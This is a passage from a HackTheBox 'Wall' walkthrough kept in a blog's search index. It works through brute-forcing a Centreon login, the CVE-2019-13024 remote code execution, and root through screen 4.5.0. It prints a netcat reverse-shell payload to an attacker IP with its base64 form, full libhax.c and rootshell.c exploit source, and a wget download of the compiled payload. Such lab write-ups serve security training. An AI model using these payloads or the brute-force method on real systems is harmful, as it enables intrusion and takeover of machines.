200)</span><br><span class="line"></span><br><span class="line">→ /server-status  (Status: 401)</span><br><span class="line"></span><br><span class="line">→ /monitoring  (Status: 403)</span><br></pre></td></tr></table></figure><p>Now let’s take a look with the following page I got. First the “aa.php”<br><code>http://10.10.10.157/aa.php</code></p><p><img src="/img/wall/aa_page.png" alt="HackTheBox-Wall/aa_page.png" title="aa.php page"><br>No interesting things here.</p><p>So next the <code>server-status</code> page<br><code>http://10.10.10.157/server-status</code></p><p><img src="/img/wall/forbidden.png" alt="HackTheBox-Wall/forbidden.png" title="forbidden page"><br>And I got the Forbidden page.</p><p>Next the is the <code>monitoring</code> page<br><code>http://10.10.10.157/monitoring</code></p><p><img src="/img/wall/monitoring.png" alt="HackTheBox-Wall/monitoring.png" title="monitoring page"></p><p>And I got a pop-up login. This page is very interesting but I don’t have any credentials so i will leave this for a while and try to enumerate again the machine using <a href="https://github.com/sullo/nikto" target="_blank" rel="noopener">Nikto</a> - Web Server scanner.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash</span></span><br><span class="line">nikto -h http://10.10.10.157/</span><br></pre></td></tr></table></figure><h3 id="Nikto-results"><a href="#Nikto-results" class="headerlink" title="Nikto results"></a>Nikto results</h3><p><img src="/img/wall/nikto.png" alt="HackTheBox-Wall/nikto.png" title="nikto results"></p><p>Next is I will intercept this request with <a href="https://portswigger.net/burp" target="_blank" rel="noopener">BurpSuite</a> (A Web Penetration Testing tool) and send this to Repeater.</p><p><img src="/img/wall/burp.png" alt="HackTheBox-Wall/burp.png" title="Burp Suite"></p><p>Repeater<br><img src="/img/wall/burp_repeater.png" alt="HackTheBox-Wall/burp_repeater.png" title="Burp Suite Repeater"></p><p>Now we will change the request body method into “POST” and let’s see what response we can get.<br><img src="/img/wall/burp_centreon.png" alt="HackTheBox-Wall/burp_centreon.png" title="The centreon page"></p><p>As you can see there’s a redirected page in URL=<code>&#39;/centreon&#39;</code> so I try this on browser to find out what is this.</p><p><img src="/img/wall/centreon_login.png" alt="HackTheBox-Wall/centreon_login.png"></p><h3 id="Centreon-Login-Page-v-19-04"><a href="#Centreon-Login-Page-v-19-04" class="headerlink" title="Centreon Login Page v. 19.04"></a>Centreon Login Page v. 19.04</h3><p>Then a Centreon Login page with version 19.04. Centreon is an open source infrastructure monitoring software.<br>Based on some googling for default creds also in the documentation of the software, I tried all combinations of “centreon”, “admin”, and “root”, but didn’t get logged in.</p><hr><h2 id="Post-Exploitation"><a href="#Post-Exploitation" class="headerlink" title="Post - Exploitation"></a>Post - Exploitation</h2><h3 id="Finding-Exploit"><a href="#Finding-Exploit" class="headerlink" title="Finding Exploit"></a>Finding Exploit</h3><p>I try to explore the login page by viewing the page source code and try to look if there’s any interesting things.<br>I also google the version of the <code>Centreon v19.04</code> and I found out that the version of this software is vulnerable to RCE(<a href="https://www.sciencedirect.com/topics/computer-science/remote-code-execution" target="_blank" rel="noopener">Remote Code Execution</a>) attack.</p><h3 id="Login-page-view-page-source"><a href="#Login-page-view-page-source" class="headerlink" title="Login page view page source"></a>Login page view page source</h3><p><img src="/img/wall/view_source.png" alt="HackTheBox-Wall/view_source.png" title="Page source"></p><h3 id="Brute-Force-the-Credentials"><a href="#Brute-Force-the-Credentials" class="headerlink" title="Brute Force the Credentials"></a>Brute Force the Credentials</h3><p>By viewing the page source code, there’s a hidden value of Centreon <code>CSRF</code> token. After some research luckily I found this <a href="https://github.com/J3wker/anti-CSRF_Token-Bruteforce" target="_blank" rel="noopener">script</a> on Github that can use to bruteforce the logins which are using <code>anti-CSRF</code> tokens to stop you from brute forcing them. I try to use this by the following commands based on the instructions of the script.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># bash shell</span></span><br><span class="line">python3 brutecsrf.py --url http://test.com/index.php --csrf name_csrf_token_in_HTML_form --u admin --fuser user_name_in_HTML_form --passwd password_name_in_HTML_form</span><br></pre></td></tr></table></figure><p><img src="/img/wall/password1.png" alt="HackTheBox-Wall/password1.png" title="Login page password"></p><p>After a minute I get the “password1” now try to use this password for login with default username “admin” ;) then I can now logged in !</p><p><img src="/img/wall/centreon.png" alt="HackTheBox-Wall/centreon.png"><br><strong>Centreon Main Page</strong></p><hr><h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>We know that the Centreon version on this machine was vulnerable to RCE(<a href="https://www.sciencedirect.com/topics/computer-science/remote-code-execution" target="_blank" rel="noopener">Remote Code Execution</a>) attack. So I did search on Google to find an article about it and what I saw was article from creator (Askar) of this box.</p><p><img src="/img/wall/google1.png" alt="HackTheBox-Wall/google1.png"></p><h2 id="Exploit-Blog-for-Centreon"><a href="#Exploit-Blog-for-Centreon" class="headerlink" title="Exploit Blog for Centreon"></a>Exploit Blog for Centreon</h2><p>Centreon v19.04 Remote Code Execution. (CVE-2019-13024)</p><a href="https://shells.systems/centreon-v19-04-remote-code-execution-cve-2019-13024/" class="link-preview" target="rel"><div class="link-area"><div class="og-image"><img src="https://shells.systems/wp-content/uploads/2019/06/post-exploit.png"></img></div><div class="descriptions"><div class="og-title">Centreon v19.04 Remote Code Execution (CVE-2019-13024) - Shells.Systems</div><div class="og-description">Estimated Reading Time:  6 minutes Summary about Centreon Centreon is …</div></div></div></a><hr><p>The exploitation triggers by adding an arbitrary command in the <code>nagios_bin</code> parameter when setup a new configuration or update configuration for a poller.</p><p><img src="/img/wall/payload_line.png" alt="HackTheBox-Wall/payload_line.png"></p><p>Based on the blog we can set a payload in <code>Monitoring Engine Binary</code>.</p><p>I tried to use the exploit script but it’s not working, I didn’t get a reverse shell, my Ncat listener can’t get any response whenever I run the exploit even I modified it.<br>So i tried to encode my payload into base64 hoping that this one will work.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># My payload</span></span><br><span class="line">rm /tmp/x22;mkfifo /tmp/xx2;cat /tmp/xx2|/bin/sh -i 2&gt;&amp;1|/bin/nc 10.10.15.44 666 &gt;/tmp/xx2</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># convert to base64</span></span><br><span class="line">cm0gL3RtcC94MjI7bWtmaWZvIC90bXAveHgyO2NhdCAvdG1wL3h4MnwvYmluL3NoIC1pIDI+JjF8L2Jpbi9uYyAxMC4xMC4xNS40NCA2NjYgPi90bXAveHgy</span><br></pre></td></tr></table></figure><p>Now I will paste our base64 code payload into <code>Monitoring Engine Binary</code>.</p><p>In the exploit script i will paste my payload too in <code>nagios_bin</code> line. with echo${IFS}</p><p>After running the exploit with my Ncat listener, still didn’t work. So I tried to search again on Google to look for other exploit of Centreon RCE and i found <a href="https://github.com/get-get-get-get/Centreon-RCE" target="_blank" rel="noopener">this.</a> Same procedure I will paste again my payload to <code>nagios_bin</code> line and next is run the exploit with my Ncat listener.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./centreon_rce.py -t http://10.10.10.157/centreon -u admin -p password1</span><br></pre></td></tr></table></figure><h3 id="WWW-DATA-SHELL-gt-shelby"><a href="#WWW-DATA-SHELL-gt-shelby" class="headerlink" title="WWW-DATA SHELL -&gt; shelby"></a>WWW-DATA SHELL -&gt; shelby</h3><p>Running this and we now get the www-data shell.<br><img src="/img/wall/www_data_shell.png" alt="HackTheBox-Wall/www_data_shell.png" title="WWW-DATA SHELL"></p><p>As you can see Bash’s job control is turned off. using this line we can enable bash command in the shell.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> TERM=xterm</span><br></pre></td></tr></table></figure><p>Now I can use commands like “id”.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ id</span><br><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data),6000(centreon)</span><br></pre></td></tr></table></figure><p>upgrade the shell with python</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">'import pty; pty.spawn("/bin/bash");'</span></span><br></pre></td></tr></table></figure><p><img src="/img/wall/right_shell.png" alt="HackTheBox-Wall/right_shell.png" title="www-data@Wall shell"></p><hr><h2 id="Privilege-Escalation"><a href="#Privilege-Escalation" class="headerlink" title="Privilege Escalation"></a>Privilege Escalation</h2><h3 id="Linux-SUID-Binaries"><a href="#Linux-SUID-Binaries" class="headerlink" title="Linux SUID Binaries"></a>Linux SUID Binaries</h3><p>Now it’s time to find some interesting things in this machine that I can use for Privilege Escalation. First I look into Linux SUID binaries. and I spotted something odd, the <code>screen</code> with version 4-5.0 was the biggest hint for me.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">find / -perm -4000 2&gt;/dev/null | xargs ls -la</span><br></pre></td></tr></table></figure><p><img src="/img/wall/screen.png" alt="HackTheBox-Wall/screen.png" title="screen-4-5.0"></p><h3 id="Screen-4-5-0"><a href="#Screen-4-5-0" class="headerlink" title="Screen 4-5.0"></a>Screen 4-5.0</h3><p>If you are familiar with Linux SUID’ you will notice that the “/bin/screen-4.5.0” is not a normally or default Linux suid so this one is very interesting so trying to use <a href="https://github.com/offensive-security/exploitdb/blob/master/searchsploit" target="_blank" rel="noopener">Searchsploit</a> if there’s an existing exploit in “screen-4.5.0”. And there is.</p><p><img src="/img/wall/searchsploit.png" alt="HackTheBox-Wall/searchsploit.png" title="searchsploit results"></p><p>I read first the .txt file of the exploit to know on how can I use this for exploitation.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">searchsploit -x exploits/linux/<span class="built_in">local</span>/41152.txt</span><br></pre></td></tr></table></figure><p><img src="/img/wall/screen_readme.png" alt="HackTheBox-Wall/screen_readme.png" title="screen readme"></p><p>It check opens the logfile with full root privileges. This allows us to truncate any file or create a root-owned file with any contents in any directory and can be easily exploited to full root acces in several ways.</p><p>Base on the instructions of the exploit, I will try to create a file “bla-bla” then use this commands “ls -la”</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">screen -D -m -L bla.bla <span class="built_in">echo</span> fail</span><br><span class="line"></span><br><span class="line">ls -la</span><br></pre></td></tr></table></figure><p><img src="/img/wall/blabla.png" alt="HackTheBox-Wall/blabla.png" title="blabla"></p><p>As you can see, the “bla.bla” file is owned by root.</p><p>I will now use the exploit script we get on the searchsploit, but it didn’t work properly so I did it manually, first I compiled the binaries on my Kali machine:</p><h3 id="libhax-c-code"><a href="#libhax-c-code" class="headerlink" title="libhax.c - code"></a>libhax.c - code</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// libhax</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dropshell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    chown(<span class="string">"/tmp/rootshell"</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">"/tmp/rootshell"</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">"/etc/ld.so.preload"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] done!\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="rootshell-c-code"><a href="#rootshell-c-code" class="headerlink" title="rootshell.c - code"></a>rootshell.c - code</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// rootshell</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">"/bin/sh"</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>Now is to compile this two exploit.</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">// libhax</span></span><br><span class="line">gcc -fPIC -shared -ldl -o libhax.so libhax.c</span><br><span class="line"></span><br><span class="line"><span class="comment">// and then the rootshell</span></span><br><span class="line">gcc -o rootshell rootshell.c</span><br></pre></td></tr></table></figure><p>After I compile the exploit i’ll transfer it to the target. To transfer the file I set a local HTTP Server in my Kali machine.</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -m SimpleHTTPServer <span class="number">80</span></span><br></pre></td></tr></table></figure><p>to download it into Wall machine, we can use <code>wget</code> commands in the <code>tmp</code> directory.</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># download the libhax</span></span><br><span class="line">wget http://10.10.15.44/libhax.so</span><br><span class="line"></span><br><span class="line"><span class="comment"># next is the rootshell</span></span><br><span class="line">wget http://10.10.15.44/libhax.c</span><br></pre></td></tr></table></figure><h3 id="Going-to-Root"><a href="#Going-to-Root" class="headerlink" title="Going to Root"></a>Going to Root</h3><p>Now i will go to the “/etc/“ directories in the target and do the exploit</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@Wall:&#x2F;tmp$ cd &#x2F;etc</span><br><span class="line">cd &#x2F;etc</span><br><span class="line">www-data@Wall:&#x2F;etc$ umask 000</span><br><span class="line">umask 000</span><br><span class="line">www-data@Wall:&#x2F;etc$ &#x2F;bin&#x2F;screen-4.5.0 -D -m -L ld.so.preload echo -ne  &quot;\x0a&#x2F;tmp&#x2F;libhax.so&quot;</span><br><span class="line">&#x2F;libhax.so&quot;-4.5.0 -D -m -L ld.so.preload echo -ne  &quot;\x0a&#x2F;tmp&#x2F;</span><br><span class="line">www-data@Wall:&#x2F;etc$ &#x2F;bin&#x2F;screen-4.5.0 -ls</span><br><span class="line">&#x2F;bin&#x2F;screen-4.5.0 -ls</span><br><span class="line">&#39; from &#x2F;etc&#x2F;ld.so.preload cannot be preloaded (cannot open shared object file): ignored.</span><br><span class="line">[+] done!</span><br><span class="line">No Sockets found in &#x2F;tmp&#x2F;screens&#x2F;S-www-data.</span><br></pre></td></tr></table></figure><p>Now going to “/tmp/rootshell”</p><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">www-data@Wall:&#x2F;etc$ &#x2F;tmp&#x2F;rootshell</span><br><span class="line">&#x2F;tmp&#x2F;rootshell</span><br><span class="line"># id</span><br><span class="line">id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root),33(www-data),6000(centreon)</span><br><span class="line"># cat &#x2F;home&#x2F;shelby&#x2F;user.txt | wc -c</span><br><span class="line">cat &#x2F;home&#x2F;shelby&#x2F;user.txt | wc -c</span><br><span class="line">33</span><br><span class="line"># cat &#x2F;root&#x2F;root.txt | wc -c</span><br><span class="line">cat &#x2F;root&#x2F;root.txt | wc -c</span><br><span class="line">33</span><br><span class="line">#</span><br></pre></td></tr></table></figure><p><img src="/img/wall/rooted!!.png" alt="HackTheBox-Wall/rooted!!.png" title="Machine Pawned!!"></p><p>Now that I’m root, I can now grab both flags – <code>user.txt</code> &amp; <code>root.txt</code> :)</p><p>If you liked my writeup please leave a respect on my <a href="https://www.hackthebox.eu/profile/128965" target="_blank" rel="noopener">Profile</a></p><p><img src="https://www.hackthebox.eu/badge/image/128965" alt="Payas0" title="Payas0"></p>]]></content>
      
      
      <categories>
          
          <category> HackTheBox </category>
          
          <category> PenTesting </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> htb </tag>
            
            <tag> pentest </tag>
            
            <tag> cve </tag>
            
            <tag> python </tag>
            
            <tag> rce </tag>
            
            <tag> linux </tag>
            
            <tag> retired </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
